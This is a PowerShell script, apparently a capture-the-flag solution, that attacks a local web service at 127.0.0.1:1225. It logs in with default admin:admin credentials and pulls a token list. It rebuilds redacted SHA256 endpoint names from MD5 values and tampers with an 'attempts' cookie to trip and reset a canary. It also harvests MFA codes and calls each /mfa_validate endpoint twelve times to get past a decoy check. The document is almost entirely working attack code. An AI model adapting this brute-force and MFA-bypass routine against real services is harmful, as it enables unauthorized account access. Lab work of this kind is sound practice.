```
# Grab the list of tokens
(iwr 'http://127.0.0.1:1225/token_overview.csv' -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin")) }).Content | Out-File output.txt

# Undo redacting of the SHA256 hashes
Function unredact {
  param($string);
  $endline = [byte[]]@(0x0A);
  $stringBytes = [System.Text.Encoding]::UTF8.GetBytes($string);
  $utf = $stringBytes + $endline;
  $mystream = [IO.MemoryStream]::new([byte[]][char[]]$utf);
  Get-FileHash -InputStream $mystream -Algorithm SHA256;
}
$unredacted_endpoints = @();
foreach($line in gc output.txt) {
  $md5 = ($line | Select-String -Pattern '([0-9a-fA-F]{32})').Matches.Value;
  if ($md5 -ne $null)
  {
    $sha256 = (unredact $md5).Hash;
    $unredacted_endpoints += @{md5=$md5;sha256=$sha256};
  }
}

# The meat of the burger
Function brute {
  param($params)

  $md5 = $params[0]
  $sha256 = $params[1]

  $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
  $cookie = [System.Net.Cookie]::new('token',$md5);
  $session.Cookies.Add('http://127.0.0.1/',$cookie);

  # trigger Canary TRIPWIRE
  $cookie = [System.Net.Cookie]::new('attempts','c25ha2VvaWw');
  $session.Cookies.Add('http://127.0.0.1/',$cookie);
  $ProgressPreference = 'SilentlyContinue';
  $response = try {(Invoke-WebRequest -WebSession $session "http://127.0.0.1:1225/tokens/$sha256" -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))}).Content} catch {}
  echo $response

  # save mfa_code
  $mfa_code = ($response | Select-String -Pattern '([0-9.]{16,})').Matches.Value;
  Write-Host "mfa_code: $mfa_code"

  # restore shared_cookie
  $cookie = [System.Net.Cookie]::new('attempts','c25ha2VvaWwK01');
  $session.Cookies.Add('http://127.0.0.1/',$cookie);

  # add valid mfa_token cookie with value mfa_code
  $cookie = [System.Net.Cookie]::new('mfa_token',$mfa_code);
  $session.Cookies.Add('http://127.0.0.1/',$cookie);

  # defeat fakeout protocol by connecting 12 times to each /mfa_validate endpoint
  for ($i=0; $i -lt 12; $i++) {
    $ProgressPreference = 'SilentlyContinue';
    $response = try {Invoke-WebRequest -WebSession $session "http://127.0.0.1:1225/mfa_validate/$sha256" -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))};} catch {}
    Write-Host "/mfa_validate: $response"
  }
}

# bruteforce every endpoint
$unredacted_endpoints | %{ brute @($_.md5,$_.sha256) }

```